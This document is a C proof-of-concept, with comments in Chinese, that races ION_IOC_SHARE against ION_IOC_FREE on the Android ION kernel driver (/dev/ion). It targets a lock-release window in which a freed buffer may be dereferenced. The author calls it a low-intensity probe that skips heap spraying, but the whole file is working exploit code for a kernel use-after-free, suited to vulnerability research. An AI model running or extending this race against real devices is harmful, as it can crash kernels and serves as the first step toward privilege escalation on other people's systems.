/*
 * ion_race.c —— ION SHARE/FREE 竞态探针（低强度，只证明窗口存在）
 *
 * 目标函数（ion.c:1147）：
 *     mutex_lock(&client->lock);
 *     valid_handle = ion_handle_validate(client, handle);
 *     mutex_unlock(&client->lock);        ← 解锁
 *     if (!valid_handle) return -EINVAL;
 *     buffer = handle->buffer;            ← 锁外解引用（窗口）
 *     ion_buffer_get(buffer);             ← kref_get(&buffer->ref)
 *
 * 线程 A：反复 SHARE 同一个 handle
 * 线程 B：反复 FREE 同一个 handle（随后重新 ALLOC 补一个，尽量维持指针有效）
 *
 * 判据（不喷 slab，只看能否观察到异常）：
 *   - SHARE 成功但 fd 非法          → 锁外读到脏 buffer
 *   - SHARE 返回 EINVAL 后的成功序列 → 正常（validate 拦住）
 *   - 进程被 SIGSEGV/BUG/panic 杀掉 → 窗口可用且更hard
 *
 * 不做的：不 spray kmalloc-32、不伪造 handle（避免制造脏状态）。
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <pthread.h>
#include <sys/ioctl.h>

#define ION_IOC_MAGIC 'I'
struct ion_handle;
struct ion_allocation_data {
	size_t len;
	size_t align;
	unsigned int heap_mask;
	unsigned int flags;
	struct ion_handle *handle;
};
struct ion_fd_data {
	struct ion_handle *handle;
	int fd;
};
struct ion_handle_data {
	struct ion_handle *handle;
};
#define ION_IOC_ALLOC	_IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
#define ION_IOC_FREE	_IOWR(ION_IOC_MAGIC, 1, struct ion_handle_data)
#define ION_IOC_SHARE	_IOWR(ION_IOC_MAGIC, 4, struct ion_fd_data)

#define ROUNDS 200

static int fd_ion;
static volatile struct ion_handle *g_h;
static volatile int g_stop;
static volatile int g_share_ok, g_share_fail, g_free_ok, g_free_fail;
static volatile int g_share_badfd;

static struct ion_handle *do_alloc(void)
{
	struct ion_allocation_data d;

	memset(&d, 0, sizeof d);
	d.len = 4096;
	d.heap_mask = 1u << 0;
	if (ioctl(fd_ion, ION_IOC_ALLOC, &d) != 0)
		return NULL;
	return d.handle;
}

static void *share_thread(void *arg)
{
	int i;

	(void)arg;
	for (i = 0; i < ROUNDS * 100; i++) {
		struct ion_fd_data fd_data;
		struct ion_handle *h = (struct ion_handle *)g_h;

		if (!h)
			continue;
		memset(&fd_data, 0, sizeof fd_data);
		fd_data.handle = h;
		if (ioctl(fd_ion, ION_IOC_SHARE, &fd_data) == 0) {
			g_share_ok++;
			if (fd_data.fd < 0) {
				g_share_badfd++;
			} else {
				close(fd_data.fd);
			}
		} else {
			g_share_fail++;
		}
	}
	return NULL;
}

static void *free_thread(void *arg)
{
	int i;

	(void)arg;
	for (i = 0; i < ROUNDS; i++) {
		struct ion_handle_data hd;
		struct ion_handle *h = (struct ion_handle *)g_h;
		struct ion_handle *nh;

		if (!h)
			continue;
		memset(&hd, 0, sizeof hd);
		hd.handle = h;
		if (ioctl(fd_ion, ION_IOC_FREE, &hd) == 0)
			g_free_ok++;
		else
			g_free_fail++;

		/* 补一个新的，让 g_h 尽量仍指向有效对象 */
		nh = do_alloc();
		if (nh)
			g_h = nh;
		usleep(50);		/* 让 SHARE 线程有大量机会落在 free 窗口里 */
	}
	g_stop = 1;
	return NULL;
}

int main(void)
{
	pthread_t ta, tb;
	struct ion_handle *h;

	setvbuf(stdout, NULL, _IONBF, 0);
	fd_ion = open("/dev/ion", O_RDWR);
	if (fd_ion < 0) {
		printf("[!] open: %s\n", strerror(errno));
		return 1;
	}

	h = do_alloc();
	if (!h) {
		printf("[!] alloc: %s\n", strerror(errno));
		return 2;
	}
	g_h = h;
	printf("[0] start h=%#x rounds=%d\n", (unsigned int)(uintptr_t)h, ROUNDS);

	pthread_create(&ta, NULL, share_thread, NULL);
	pthread_create(&tb, NULL, free_thread, NULL);
	pthread_join(tb, NULL);
	pthread_join(ta, NULL);

	printf("[1] share_ok=%d share_fail=%d share_badfd=%d\n",
	       g_share_ok, g_share_fail, g_share_badfd);
	printf("[2] free_ok=%d free_fail=%d\n", g_free_ok, g_free_fail);
	printf("[3] survived\n");
	close(fd_ion);
	return 0;
}
